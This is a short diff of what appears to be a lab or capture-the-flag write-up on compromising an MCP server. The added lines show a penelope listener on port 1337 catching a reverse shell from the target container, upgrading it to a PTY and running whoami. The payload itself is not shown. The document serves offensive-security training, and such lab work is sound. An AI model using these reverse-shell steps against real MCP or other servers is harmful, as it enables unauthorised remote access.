@@ -473,5 +473,18 @@ curl -X POST -s http://127.0.0.1:30080/mcp -H 'Content-Type: application/json' -
 Then following the MCP documentation i can call the tool
 
 ```python
-
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.48.171 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <1>
+[+] Attempting to deploy Python Agent...
+[+] PTY upgrade successful via /usr/local/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/mcp-server-54464cb475-29ztf~10.129.48.171-Linux-x86_64/2026_08_22-21_10_24-821.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+mcp@mcp-server-54464cb475-29ztf:/app$ whoami
+mcp
+mcp@mcp-server-54464cb475-29ztf:/app$
 ```
+
+I now have a shell, nb
